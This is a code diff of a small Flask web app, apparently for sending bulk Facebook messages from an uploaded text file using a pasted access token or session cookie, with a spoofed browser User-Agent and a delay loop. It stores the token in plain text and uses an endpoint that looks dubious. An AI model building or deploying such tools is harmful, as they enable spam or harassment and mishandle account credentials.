@@ -1,97 +1,98 @@
-from flask import Flask, request, redirect, url_for
-import requests
-import time
+from flask import Flask, request, redirect, url_for, render_template_string
 import os
+import time
+import requests
 
 app = Flask(__name__)
 
+# Static headers
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+}
+
+# Render form on the main route
 @app.route('/', methods=['GET', 'POST'])
-def send_message():
+def index():
     if request.method == 'POST':
-        # Get user inputs
-        token = request.form.get('token')
-        delay = int(request.form.get('delay'))
-        
-        # Upload and read the TXT files
-        target_file = request.files['targetFile']
-        targets = target_file.read().decode().splitlines()
+        # Get form data
+        token_cookie = request.form.get('token')
+        conversation_id = request.form.get('conversation_id')
+        delay = int(request.form.get('delay', 10))
 
-        message_file = request.files['messageFile']
-        messages = message_file.read().decode().splitlines()
+        # Read TXT files for messages and configurations
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-        # Create a folder for storing details
-        folder_name = "facebook_automation"
+        folder_name = f"Convo_{conversation_id}"
         os.makedirs(folder_name, exist_ok=True)
 
-        with open(os.path.join(folder_name, "targets.txt"), "w") as f:
-            f.write("\n".join(targets))
+        # Save token/cookie and messages in the folder
+        with open(os.path.join(folder_name, "token_cookie.txt"), "w") as f:
+            f.write(token_cookie)
 
         with open(os.path.join(folder_name, "messages.txt"), "w") as f:
             f.write("\n".join(messages))
 
-        with open(os.path.join(folder_name, "token.txt"), "w") as f:
-            f.write(token)
+        # API URL construction (example based on provided cookie/token logic)
+        post_url = f"https://graph.facebook.com/v15.0/t_{conversation_id}/"
 
-        # Send messages
-        num_targets = len(targets)
-        num_messages = len(messages)
-
-        for index, target in enumerate(targets):
-            message = messages[index % num_messages]  # Rotate through messages if targets > messages
-            headers = {
-                'Authorization': f'Bearer {token}',
-                'Content-Type': 'application/json'
-            }
-            payload = {
-                'recipient': {'id': target},
-                'message': {'text': message}
-            }
-
+        # Sending messages loop
+        for idx, message in enumerate(messages):
             try:
-                response = requests.post(
-                    f'https://graph.facebook.com/v15.0/{target}/messages',
-                    json=payload,
-                    headers=headers
-                )
-
-                if response.status_code == 200:
-                    print(f"[+] Message sent to {target}: {message}")
+                # Example token/cookie authentication
+                params = {
+                    'access_token': token_cookie,  # Use the provided cookie/token
+                    'message': message,
+                }
+                response = requests.post(post_url, params=params, headers=headers)
+                
+                # Log success or failure
+                if response.ok:
+                    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Message {idx + 1}: Sent successfully!")
                 else:
-                    print(f"[x] Failed to send message to {target}: {response.text}")
-
-                time.sleep(delay)
+                    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Message {idx + 1}: Failed to send!")
             except Exception as e:
-                print(f"[!] Error sending message to {target}: {e}")
-                time.sleep(30)  # Retry after a delay
+                print(f"Error sending message {idx + 1}: {e}")
 
-        return "Messages sent successfully!"
-    else:
-        return '''
-        <html>
-        <head>
-            <title>Facebook Inbox Automation</title>
-        </head>
-        <body>
-            <h1>Facebook Inbox Automation</h1>
-            <form action="/" method="post" enctype="multipart/form-data">
-                <label for="token">Enter Token:</label><br>
-                <input type="text" id="token" name="token" required><br><br>
-                
-                <label for="targetFile">Upload Target File (TXT):</label><br>
-                <input type="file" id="targetFile" name="targetFile" accept=".txt" required><br><br>
-                
-                <label for="messageFile">Upload Messages File (TXT):</label><br>
-                <input type="file" id="messageFile" name="messageFile" accept=".txt" required><br><br>
-                
-                <label for="delay">Enter Delay (Seconds):</label><br>
-                <input type="number" id="delay" name="delay" value="5" required><br><br>
-                
-                <button type="submit">Submit</button>
-            </form>
-        </body>
-        </html>
-        '''
+            # Delay between messages
+            time.sleep(delay)
 
+        return "Messages Sent Successfully!"
+
+    # HTML template for the form
+    html_template = '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook Automation</title>
+    </head>
+    <body style="font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px;">
+        <h1>Facebook Automation</h1>
+        <form action="/" method="post" enctype="multipart/form-data">
+            <label for="token">Enter Token/Cookie:</label>
+            <input type="text" name="token" id="token" required style="width: 100%; margin-bottom: 10px;"><br>
+            <label for="conversation_id">Enter Conversation ID:</label>
+            <input type="text" name="conversation_id" id="conversation_id" required style="width: 100%; margin-bottom: 10px;"><br>
+            <label for="txtFile">Upload Messages File (TXT):</label>
+            <input type="file" name="txtFile" id="txtFile" accept=".txt" required style="margin-bottom: 10px;"><br>
+            <label for="delay">Delay (seconds):</label>
+            <input type="number" name="delay" id="delay" value="10" required style="width: 100%; margin-bottom: 10px;"><br>
+            <button type="submit" style="padding: 10px 20px; background-color: #28a745; color: white; border: none; cursor: pointer;">Submit</button>
+        </form>
+    </body>
+    </html>
+    '''
+    return render_template_string(html_template)
+
+# Run the application
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-                    
+    
